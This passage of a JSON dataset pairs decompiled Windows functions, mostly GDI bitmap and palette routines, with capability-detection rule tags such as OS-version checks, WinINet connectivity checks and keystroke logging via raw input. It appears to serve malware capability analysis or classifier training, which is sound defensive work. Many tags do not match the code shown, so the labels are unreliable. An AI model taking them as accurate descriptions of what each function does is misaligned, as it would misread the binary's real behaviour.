0x4263ee;\n        cVar2 = fcn.004266a0();\n        if (cVar2 == '\\0') {\n            puStack80 = 0x3;\n            uStack84 = 0x4263fc;\n            uStack84 = fcn.00421c8c();\n            puStack88 = 0x426402;\n            sub.gdi32.dll_SetStretchBltMode();\n        }\n    }\n    uStack92 = 0x426552;\n    puStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    puStack100 = 0x426417;\n    puStack88 = &stack0xfffffffc;\n    cVar2 = (**(*in_EAX + 0x28))();\n    if (cVar2 != '\\0') {\n        puStack100 = 0x426422;\n        fcn.00426930();\n    }\n    puStack100 = 0x426429;\n    fcn.004265e4();\n    puStack100 = 0x426435;\n    fcn.00421d68();\n    puStack100 = 0x42643c;\n    cVar2 = (**(*in_EAX + 0x28))();\n    if (cVar2 != '\\0') {\n        uStack104 = 0x4264e7;\n        uStack108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStack100 = &stack0xfffffffc;\n        sub.gdi32.dll_CreateCompatibleDC(0);\n        iVar3 = fcn.00422090();\n        iVar4 = sub.gdi32.dll_SelectObject(iVar3, *(iVar6 + 0xc));\n        arg_2ch = param_1[2] - *param_1;\n        arg_28h = param_1[3] - param_1[1];\n        iVar5 = fcn.004265e4();\n        uVar7 = 0;\n        fcn.00422240(0, 0, iVar3, *(iVar6 + 0x20), *(iVar6 + 0x1c), 0, 0, *(iVar5 + 4), arg_28h, arg_2ch);\n        *in_FS_OFFSET = uVar7;\n        if (iVar4 != 0) {\n            sub.gdi32.dll_SelectObject(iVar3, iVar4, 0x42652c);\n        }\n        if (iVar3 != 0) {\n            sub.gdi32.dll_DeleteDC(iVar3);\n        }\n        return;\n    }\n    puStack100 = *(var_4h + 0x20);\n    uStack104 = *(iVar6 + 0x20);\n    uStack108 = *(iVar6 + 0x1c);\n    iVar6 = fcn.004265e4(0, 0);\n    uVar7 = *(var_4h + 4);\n    sub.gdi32.dll_StretchBlt(uVar7, *param_1, param_1[1], param_1[2] - *param_1, param_1[3] - param_1[1], *(iVar6 + 4));\n    *in_FS_OFFSET = uVar7;\n    if (var_9h != '\\0') {\n        sub.gdi32.dll_SelectPalette(*(var_4h + 4), var_8h, 0xffffffff, 0x426559);\n    }\n    return;\n}\n",
        "token_count": 1561
    },
    "00426564": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00426564(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (1 < *(iVar1 + 4)) {\n        fcn.00426890();\n        fcn.004261b0(iVar1 + 0x18);\n        return;\n    }\n    if ((*(iVar1 + 8) != 0) && (*(iVar1 + 8) != *(iVar1 + 0x14))) {\n        if ((*(iVar1 + 0x14) != 0) && (iVar2 = sub.gdi32.dll_DeleteObject(*(iVar1 + 0x14)),  iVar2 == 0)) {\n            fcn.00421fe8();\n        }\n        *(iVar1 + 0x14) = 0;\n        *(iVar1 + 0x2c) = 0;\n    }\n    return;\n}\n",
        "token_count": 215
    },
    "004265e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.004265e4(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX[0xb] == 0) {\n        fcn.00426890();\n        if (in_EAX[0xb] == 0) {\n            iVar1 = fcn.00425374();\n            in_EAX[0xb] = iVar1;\n            *(iVar1 + 0x2c) = in_EAX;\n            *(iVar1 + 0x28) = *(*in_EAX + 0x10);\n            *(iVar1 + 0x34) = in_EAX;\n            *(iVar1 + 0x30) = fcn.00426270;\n        }\n    }\n    return in_EAX[0xb];\n}\n",
        "token_count": 176
    },
    "00426650": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00426650(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    unkbyte3 Var3;\n    uint uVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    Var3 = iVar1 >> 8;\n    if ((*(iVar1 + 8) == 0) || (*(iVar1 + 8) == *(iVar1 + 0x14))) {\n        if (*(iVar1 + 0x14) != 0) {\n            return 0;\n        }\n        if (*(iVar1 + 0x30) == 0) {\n            uVar2 = CONCAT31(Var3, 1);\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = CONCAT31(Var3, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 193
    },
    "004266a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.004266a0(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 0x28) == 1) && (*(iVar1 + 0x2a) == 1)) {\n        return CONCAT31(iVar1 + 0x18 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 101
    },
    "0042680c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042680c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 8) != 0) && (*(iVar1 + 0x14) == 0)) {\n        fcn.00426990();\n        if (*(iVar1 + 0x30) == 0) {\n            sub.gdi32.dll_GetObjectA(*(iVar1 + 8), 0x54, iVar1 + 0x18);\n            *(iVar1 + 0x30) = 0x28;\n            *(iVar1 + 0x34) = *(iVar1 + 0x1c);\n            *(iVar1 + 0x38) = *(iVar1 + 0x20);\n            *(iVar1 + 0x3c) = 1;\n            *(iVar1 + 0x3e) = *(iVar1 + 0x28) * *(iVar1 + 0x2a);\n        }\n        uVar2 = fcn.0042573c(0, iVar1 + 0x18);\n        *(iVar1 + 0x14) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 280
    },
    "00426890": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00426890(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStackY40;\n    uint uStackY36;\n    uchar *puStackY32;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (((*(iVar1 + 8) == 0) && (*(iVar1 + 0x14) == 0)) && (*(iVar1 + 0x6c) != 0)) {\n        puStackY32 = 0x4268bd;\n        fcn.00417550(0, 0);\n        iVar1 = in_EAX[4];\n        iVar2 = in_EAX[5];\n        uStackY36 = 0x426913;\n        uStackY40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        in_EAX[4] = 0;\n        in_EAX[5] = 0;\n        puStackY32 = &stack0xfffffffc;\n        (**(*in_EAX + 0x54))();\n        *in_FS_OFFSET = uStackY40;\n        in_EAX[4] = iVar1;\n        in_EAX[5] = iVar2;\n        return;\n    }\n    iVar1 = in_EAX[10];\n    if (*(iVar1 + 8) == 0) {\n        *(iVar1 + 8) = *(iVar1 + 0x14);\n    }\n    return;\n}\n",
        "token_count": 352
    },
    "00426930": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00426930(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((*(in_EAX + 0x32) == '\\0') || (*(in_EAX + 0x31) == '\\0')) {\n        iVar1 = *(in_EAX + 0x28);\n        if (*(iVar1 + 0xc) != 0) {\n            fcn.004252f8();\n            sub.gdi32.dll_DeleteObject(*(iVar1 + 0xc));\n            *(iVar1 + 0xc) = 0;\n        }\n        fcn.00426880();\n        fcn.00426890();\n        iVar1 = *(in_EAX + 0x28);\n        fcn.004267bc();\n        uVar2 = fcn.00425e04();\n        *(iVar1 + 0xc) = uVar2;\n        *(in_EAX + 0x32) = 1;\n        *(in_EAX + 0x31) = 1;\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "00426990": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00426990(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    char cVar6;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (*(in_EAX + 0x30) != '\\0') {\n        return;\n    }\n    if (*(iVar1 + 0x10) != 0) {\n        return;\n    }\n    if (*(iVar1 + 0x14) == 0) {\n        return;\n    }\n    if (*(iVar1 + 0x14) == *(iVar1 + 8)) {\n        fcn.004252f8();\n    }\n    iVar2 = fcn.00422788();\n    *(iVar1 + 0x10) = iVar2;\n    if (iVar2 != 0) {\n        return;\n    }\n    sub.user32.dll_GetDC(0);\n    uVar3 = fcn.00422090();\n    if (*(iVar1 + 0x71) == '\\0') {\n        iVar2 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0xc);\n        iVar4 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0xe);\n        if (*(iVar1 + 0x2a) * *(iVar1 + 0x28) <= iVar2 * iVar4) {\n            cVar6 = '\\0';\n            goto code_r0x00426a21;\n        }\n    }\n    cVar6 = '\\x01';\ncode_r0x00426a21:\n    *(iVar1 + 0x71) = cVar6;\n    if (cVar6 != '\\0') {\n        uVar5 = sub.gdi32.dll_CreateHalftonePalette(uVar3);\n        *(iVar1 + 0x10) = uVar5;\n    }\n    sub.user32.dll_ReleaseDC(0, uVar3);\n    if (*(iVar1 + 0x10) == 0) {\n        *(in_EAX + 0x30) = 1;\n    }\n    return;\n}\n",
        "token_count": 470
    },
    "00426a48": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426a48(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    int16_t in_DX;\n    uint var_54h;\n    int32_t var_40h;\n    uint var_3ch;\n    \n    if ((in_DX != 2) || (in_ECX == 0)) {\n        fcn.00421f58();\n    }\n    fcn.00426880();\n    fcn.00403720();\n    sub.gdi32.dll_GetObjectA();\n    if (var_40h == 0) {\n        var_3ch = 0;\n    }\n    fcn.004261b0(&var_54h);\n    *(in_EAX[10] + 0x70) = 0;\n    iVar1 = (**(*in_EAX + 0x24))();\n    *(in_EAX + 0x22) = iVar1 != 0;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 235
    },
    "00426b50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426b50(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t iVar3;\n    uint in_EDX;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x426b6c;\n    iVar1 = fcn.00403f28();\n    puStack32 = 0x426bd8;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(iVar1 + 8) = in_EDX;\n    *(iVar1 + 0x10) = in_ECX;\n    puVar4 = iVar1 + 0x18;\n    for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = *arg_10h;\n        arg_10h = arg_10h + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *(iVar1 + 0x70) = arg_ch;\n    if (*(iVar1 + 0x2c) != 0) {\n        *(iVar1 + 0x14) = *(iVar1 + 8);\n    }\n    uStack40 = 0x426bc8;\n    puStack28 = &stack0xfffffffc;\n    uVar2 = fcn.00404108();\n    *(iVar1 + 0x6c) = uVar2;\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x49636c;\n    puStack32 = 0x426bf9;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack36 = 0x426c38;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.0042556c();\n    *(in_EAX + 0x28) = iVar1;\n    fcn.00425568();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x426c3f;\n    uStack36 = 0x49636c;\n    uStack40 = 0x426c37;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 573
    },
    "00427258": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427258(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    int32_t iStack116;\n    uint uStack112;\n    uint *puStack108;\n    uint lpvObject;\n    int32_t var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (param_2 != *(iVar1 + 8)) {\n        puStack108 = 0x427278;\n        fcn.00426880();\n        puStack108 = 0x427287;\n        fcn.00403720();\n        if (param_2 != 0) {\n            puStack108 = &fcn.00427258::lpvObject;\n            uStack112 = 0x54;\n            puStack120 = 0x427297;\n            iStack116 = param_2;\n            sub.gdi32.dll_GetObjectA();\n        }\n        if (*(iVar1 + 4) == 1) {\n            var_4h = *(iVar1 + 0x10);\n            *(iVar1 + 0x10) = 0;\n        }\n        else if (*(iVar1 + 0x10) == *0x496350) {\n            var_4h = *0x496350;\n        }\n        else {\n            puStack120 = 0x4272c4;\n            var_4h = fcn.00425da0();\n        }\n        uStack124 = 0x4272f3;\n        uStack128 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff80;\n        uVar2 = 0;\n        puStack120 = &stack0xfffffffc;\n        fcn.00426b50(0, 0, &fcn.00427258::lpvObject);\n        *in_FS_OFFSET = uVar2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 459
    },
    "00427474": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427474(uint param_1, uint8_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint auStack96 [4];\n    uint16_t uStack80;\n    uint16_t uStack78;\n    uint uStack72;\n    uint16_t uStack60;\n    uint16_t uStack58;\n    \n    iVar1 = in_EAX[10];\n    if ((*(iVar1 + 0x3c) == 1) && (*(iVar1 + 0x3e) == 1)) {\n        uVar2 = 1;\n    }\n    else {\n        uVar2 = 0;\n    }\n    if (param_2 != uVar2) {\n        fcn.00426890();\n        puVar4 = iVar1 + 0x18;\n        puVar5 = auStack96;\n        for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        uStack72 = 0;\n        uStack60 = param_2;\n        uStack80 = param_2;\n        uStack78 = uStack80;\n        uStack58 = uStack60;\n        fcn.004261b0(auStack96);\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 363
    },
    "004274f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004274f0(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint uStack124;\n    uint uStack120;\n    uchar *puStack116;\n    uint var_58h;\n    uint var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (param_2 != *(iVar1 + 0x10)) {\n        if ((param_2 == 0) && (*(iVar1 + 4) == 1)) {\n            fcn.0041fddc();\n            *(iVar1 + 0x10) = 0;\n        }\n        else {\n            fcn.00426880();\n            fcn.00426890();\n            puVar3 = iVar1 + 0x18;\n            puVar4 = &fcn.004274f0::var_58h;\n            for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            puStack116 = 0x427556;\n            var_4h = fcn.0042573c(0, &fcn.004274f0::var_58h);\n            uStack120 = 0x427588;\n            uStack124 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff84;\n            uVar5 = 0;\n            puStack116 = &stack0xfffffffc;\n            fcn.00426b50(0, *(iVar1 + 0x70), &fcn.004274f0::var_58h);\n            *in_FS_OFFSET = uVar5;\n        }\n        fcn.00425634();\n        *(in_EAX + 0x22) = 1;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 477
    },
    "004275c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004275c4(uint param_1, uint8_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint var_5dh;\n    uint var_59h;\n    uint var_55h;\n    uint var_49h;\n    uint var_45h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_39h;\n    uint var_35h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    int32_t var_9h;\n    int32_t *var_4h;\n    \n    uStack116 = 0x4275da;\n    var_4h = in_EAX;\n    uVar2 = fcn.004266d0();\n    if (param_2 != uVar2) {\n        if (param_2 == 0) {\n            uStack116 = 0x4275f8;\n            (**(*var_4h + 0x70))();\n        }\n        else {\n            if (param_2 != 8) {\n                uStack116 = 0x42761b;\n                fcn.00403720();\n                iVar1 = var_4h[10];\n                puVar5 = iVar1 + 0x18;\n                puVar6 = &fcn.004275c4::var_5dh;\n                for (iVar4 = 6; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar6 = *puVar5;\n                    puVar5 = puVar5 + 1;\n                    puVar6 = puVar6 + 1;\n                }\n                var_9h._0_1_ = '\\0';\n                var_49h = 0;\n                var_45h = 0x28;\n                var_41h = var_59h;\n                var_3dh = var_55h;\n                var_39h._0_2_ = 1;\n                var_39h._2_2_ = *(param_2 + 0x490dfb);\n                unique0x00007a00 = *(iVar1 + 0x10);\n                if (param_2 == 2) {\n                    stack0xfffffff4 = *0x496350;\n                }\n                else if (param_2 == 3) {\n                    uStack116 = 0;\n                    uStack120 = 0x427685;\n                    sub.user32.dll_GetDC();\n                    uStack120 = 0x42768a;\n                    uVar3 = fcn.00422090();\n                    uStack124 = 0x427692;\n                    uStack120 = uVar3;\n                    *NULL = sub.gdi32.dll_CreateHalftonePalette();\n                    var_9h._0_1_ = '\\x01';\n                    uStack128 = 0;\n                    puStack132 = 0x4276a1;\n                    uStack124 = uVar3;\n                    sub.user32.dll_ReleaseDC();\n                }\n                else if (param_2 == 5) {\n                    var_35h = 3;\n                    var_1dh = 0xf800;\n                    var_19h = 0x7e0;\n                    var_15h = 0x1f;\n                }\n                uStack136 = 0x427710;\n                iStack140 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffff74;\n                puVar5 = &fcn.004275c4::var_5dh;\n                puStack132 = &stack0xfffffffc;\n                (**(*var_4h + 0x68))();\n                fcn.004261b0(puVar5);\n                *(var_4h + 0x22) = stack0xfffffff4 != 0;\n                *in_FS_OFFSET = puVar5;\n                uStack136 = 0x427717;\n                if (var_9h != '\\0') {\n                    iStack140 = stack0xfffffff4;\n                    sub.gdi32.dll_DeleteObject();\n                }\n                return;\n            }\n            uStack116 = 0x427607;\n            fcn.00421f58();\n        }\n    }\n    return;\n}\n",
        "token_count": 1016
    },
    "0042772c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042772c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (param_2 != in_EAX[0xd]) {\n        if (param_2 == 0x20000000) {\n            *(in_EAX + 0xe) = 0;\n        }\n        else {\n            *(in_EAX + 0xe) = 1;\n        }\n        in_EAX[0xd] = param_2;\n        iVar1 = in_EAX[10];\n        if (1 < *(iVar1 + 4)) {\n            fcn.00426890();\n            fcn.004261b0(iVar1 + 0x18);\n        }\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "00427d5c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00427d5c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uStack32;\n    int16_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 8) == 0) && (*(iVar1 + 0xc) != 0)) {\n        iVar2 = 0;\n        fcn.00417550(0, 0);\n        uStack32 = 0x427d8b;\n        fcn.0041775c();\n        if (iVar2 != 0) {\n            if (iVar2 == 1) {\n                uStack32 = 6;\n                fcn.00422adc(iVar1 + 0x10, in_EAX + 0x2c);\n            }\n            else {\n                uStack32 = 0x427dc7;\n                fcn.00421f7c();\n            }\n        }\n        *(iVar1 + 8) = uStack32;\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "00427dd4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00427dd4(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ah;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (*(iVar1 + 0xc) == 0) {\n        if (*(iVar1 + 8) == 0) {\n            puStack32 = 0x427df7;\n            fcn.00421f7c();\n        }\n        puStack32 = 0x427e03;\n        uVar2 = fcn.00403f28();\n        uStack36 = 0x427e61;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        iVar3 = fcn.00427d20();\n        if (iVar3 == *0x496368) {\n            fcn.00403720();\n            fcn.00417794();\n        }\n        else {\n            fcn.00427d20();\n            fcn.0042302c();\n        }\n        *in_FS_OFFSET = uStack40;\n        *(iVar1 + 0xc) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 314
    },
    "0042813c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid fcn.0042813c(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uchar *puStack272;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack272 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack276 = 0x42823f;\n    uStack280 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee8;\n    uStack284 = 0x48;\n    uStack288 = *0x496358;\n    uStack292 = 8;\n    puStack296 = 0x428167;\n    *0x490b38 = sub.kernel32.dll_MulDiv();\n    *0x490b38 = -*0x490b38;\n    if (**0x492cfc == 1) {\n        puStack296 = 0x42817d;\n        cVar1 = fcn.004280f8();\n        if (cVar1 == -0x80) {\n            puStack296 = 0x42818e;\n            fcn.00404e38();\n        }\n    }\n    puStack296 = 0x42819a;\n    var_8h = fcn.0041e930();\n    uStack300 = 0x4281f7;\n    uStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    puStack296 = &stack0xfffffffc;\n    fcn.0041e9d0();\n    cVar1 = fcn.0041ea34();\n    if (cVar1 != '\\0') {\n        fcn.0041ec64();\n        fcn.0041e9a0();\n    }\n    *in_FS_OFFSET = uStack304;\n    puStack296 = 0x4281fe;\n    uStack300 = 0x4281f6;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 476
    },
    "00428394": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428394(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4283ac;\n    fcn.0042837c();\n    uStack32 = 0x428435;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    for (var_8h = *(in_EAX + 4); (var_8h != NULL && ((param_2 != var_8h[2] || (param_1 != var_8h[3]))));\n        var_8h = *var_8h) {\n    }\n    if (var_8h == NULL) {\n        puStack28 = &stack0xfffffffc;\n        puVar1 = fcn.00402ce4();\n        *puVar1 = *(in_EAX + 4);\n        uVar2 = fcn.00428448();\n        puVar1[1] = uVar2;\n        puVar1[2] = param_2;\n        puVar1[3] = param_1;\n        *(in_EAX + 4) = puVar1;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x42843c;\n    uStack32 = 0x428434;\n    fcn.00428388();\n    return;\n}\n",
        "token_count": 365
    },
    "004285c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
